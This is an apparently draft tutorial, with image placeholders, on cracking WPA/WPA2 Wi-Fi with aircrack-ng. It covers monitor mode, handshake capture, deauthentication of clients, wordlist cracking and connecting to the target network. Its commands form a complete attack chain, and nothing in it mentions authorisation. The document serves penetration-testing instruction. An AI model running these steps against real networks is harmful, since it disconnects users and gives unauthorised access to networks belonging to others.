## Step 1: Set Up Your Wireless Interface
Before starting any attack, you need to put your wireless network interface card (NIC) into **monitor mode**. This mode allows the card to capture and inject packets.

### 1.1. Enable Monitor Mode using Airmon-ng
1. First, open a terminal and list your network interfaces:
   ```bash
   iwconfig
```

2. Put your wireless interface into monitor mode using **Airmon-ng**:
    
    ```bash
    sudo airmon-ng start wlan0
    ```
    
3. Verify that your interface is now in monitor mode (e.g., `wlan0mon`):
    
    ```bash
    iwconfig
    ```
    

{picture: Insert image of command output showing interface in monitor mode}

## Step 2: Start Capturing Packets with Airodump-ng

Now, you need to start scanning for nearby networks using **Airodump-ng**. This will allow you to find the target network and gather information about it.

### 2.1. Start Airodump-ng

1. Run **Airodump-ng** on your monitor interface:
    
    ```bash
    sudo airodump-ng wlan0mon
    ```
    
2. Airodump-ng will list all the available wireless networks, showing important details like the **SSID**, **BSSID** (MAC address of the access point), **Channel**, **Encryption Type**, and **Number of Clients**.
    

{picture: Insert image of Airodump-ng output showing network details}

### 2.2. Focus on a Specific Target Network

To focus on a specific network, note down the **BSSID** (MAC address of the access point) and the **Channel** number of your target network.

Use the following command to target a specific network:

```bash
sudo airodump-ng --bssid [Target_BSSID] -c [Target_Channel] wlan0mon
```

- Replace `[Target_BSSID]` with the BSSID of the target AP.
- Replace `[Target_Channel]` with the channel number of the AP.

{picture: Insert image showing filtered scan of a target network in Airodump-ng}

## Step 3: Capture WPA Handshake

To crack WPA/WPA2 encryption, you need to capture the WPA handshake. This handshake is exchanged between the client and the AP when a client connects to the network.

### 3.1. Wait for a Client to Reconnect

You can either wait for a client to reconnect to the AP, or you can force a disconnection using **Aireplay-ng**.

{picture: Insert image showing the capture of a WPA handshake in Airodump-ng}

### 3.2. Capture Handshake

Once a client reconnects to the AP, you will see the following message in the Airodump-ng output:

```
[ WPA handshake: XX:XX:XX:XX:XX:XX ]
```

This indicates that the WPA handshake has been successfully captured.

## Step 4: Perform a Deauthentication Attack Using Aireplay-ng

If no clients are actively connecting to the network, you can perform a **deauthentication attack** to force a client to disconnect and reconnect to the AP, thereby capturing the handshake.

### 4.1. Start the Deauthentication Attack

Use **Aireplay-ng** to send deauthentication packets to the AP and target client:

```bash
sudo aireplay-ng -0 10 -a [Target_AP_BSSID] -c [Target_Client_MAC] wlan0mon
```

- `-0` specifies the deauthentication attack.
- `10` is the number of deauthentication frames to send.
- `-a [Target_AP_BSSID]` specifies the BSSID of the target access point.
- `-c [Target_Client_MAC]` specifies the MAC address of a connected client.

{picture: Insert image showing terminal output of deauthentication attack}

### 4.2. Capture the Handshake After Deauthentication

After sending the deauthentication packets, the client will disconnect and attempt to reconnect. This process will trigger the handshake exchange, and Airodump-ng will capture it.

{picture: Insert image showing WPA handshake captured after deauthentication attack}

## Step 5: Crack the WPA Handshake

Once you have captured the WPA handshake, the next step is to crack the password using tools like **Aircrack-ng** or **Hashcat**.

### 5.1. Crack the Handshake with Aircrack-ng

Use the following command to attempt cracking the WPA password:

```bash
aircrack-ng capture_file.cap -w /path/to/wordlist.txt
```

- Replace `capture_file.cap` with the filename of the capture file containing the WPA handshake.
- Replace `/path/to/wordlist.txt` with the path to your wordlist for brute-force cracking.

{picture: Insert image showing Aircrack-ng running with WPA handshake and wordlist}

### 5.2. Wait for Cracking to Complete

If the password is in the wordlist, **Aircrack-ng** will successfully crack the WPA password and display it in the terminal:

```
[ WPA ] Found WPA2 PSK: [Password]
```

{picture: Insert image showing successful WPA password cracking output from Aircrack-ng}

## Step 6: Access the Network

Once the WPA password is cracked, you can use it to connect to the target Wi-Fi network.

### 6.1. Connect to the Target Network

Use the following command to connect to the network:

```bash
nmcli dev wifi connect [Target_SSID] password [Password]
```

- Replace `[Target_SSID]` with the name of the target network.
- Replace `[Password]` with the cracked WPA password.

{picture: Insert image showing successful Wi-Fi connection with the cracked password}

---

## Conclusion

You have successfully used **Airodump-ng** and **Aireplay-ng** to capture a WPA handshake, perform a deauthentication attack, and crack the WPA password. This process is a fundamental technique used in penetration testing and Wi-Fi network security assessments.
